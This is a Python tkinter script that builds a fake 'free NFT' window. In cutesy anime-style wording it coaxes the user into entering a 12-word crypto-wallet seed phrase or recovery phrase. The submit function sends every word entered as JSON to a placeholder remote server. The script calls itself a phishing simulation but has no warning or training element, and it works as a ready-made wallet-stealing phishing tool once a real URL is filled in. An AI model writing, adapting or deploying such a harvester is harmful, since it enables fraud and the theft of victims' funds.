import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import os
import requests

def submit():
    words = [e.get() for e in entries]
    extra = extra_entry.get()
    all_words = words + ([extra] if extra else [])

    # Send to AWS server
    try:
        response = requests.post("https://your-server-url.com/report", json={
            "seed_words": all_words,
            "source": "phishing_simulation_gui"
        })
        if response.status_code == 200:
            messagebox.showinfo("arigatou senpai!", "Your meme has been sent!")
        else:
            messagebox.showerror("Oops!", "Failed to report to server.")
    except Exception as e:
        messagebox.showerror("Error", f"Could not connect to server:\n{e}")

def limit_entry_length(P):
    return len(P) <= 6

def on_enter(event):
    event.widget.config(bg="#ffe6f0")  # light pink

def on_leave(event):
    event.widget.config(bg="white")  # default

# Load the image from the current folder
image_path = os.path.join(os.path.dirname(__file__), "your_image.png")  # Replace with your image filename

# Set up the window
root = tk.Tk()
root.title("p-please senpai /// or else your free NFT will expire!")

# Main horizontal frame
main_frame = tk.Frame(root)
main_frame.pack(padx=20, pady=20)

# Load the image using Pillow
try:
    image = Image.open(image_path)
    photo = ImageTk.PhotoImage(image)
    image_label = tk.Label(main_frame, image=photo)
    image_label.image = photo  # Keep a reference to avoid garbage collection
    image_label.pack(side="left", padx=20)
except FileNotFoundError:
    print(f"Image not found: {image_path}")

# Right-side frame for inputs
input_frame = tk.Frame(main_frame)
input_frame.pack(side="left", padx=20)

# Bold large title
label = tk.Label(
    input_frame,
    text="w-would you let me see your secret words p-please?\nkey in your seed phrase o-onegai~",
    font=("Arial", 16, "bold"),
    justify="center"
)
label.pack(pady=10)

# Frame for 12 boxes
entry_grid = tk.Frame(input_frame)
entry_grid.pack(pady=10)

vcmd = (root.register(limit_entry_length), '%P')

entries = []
for i in range(12):
    e = tk.Entry(entry_grid, width=10, font=("Arial", 12), validate="key", validatecommand=vcmd)
    e.grid(row=i//4, column=i%4, padx=5, pady=5)
    e.bind("<Enter>", on_enter)
    e.bind("<Leave>", on_leave)
    entries.append(e)

# Extra box for recovery phrase
extra_label = tk.Label(
    input_frame,
    text="if it is more than 12 words or uses a recovery phrase, please fill it here!",
    font=("Arial", 12, "bold"),
    wraplength=300,
    justify="center"
)
extra_label.pack(pady=10)

extra_entry = tk.Entry(input_frame, width=50, font=("Arial", 12))
extra_entry.pack(pady=5)
extra_entry.bind("<Enter>", on_enter)
extra_entry.bind("<Leave>", on_leave)

# Button
button = tk.Button(
    input_frame,
    text="arigatou senpai!",
    font=("Arial", 14, "bold"),
    bg="#ffcccc",
    fg="black",
    command=submit
)
button.pack(pady=20)

root.mainloop()
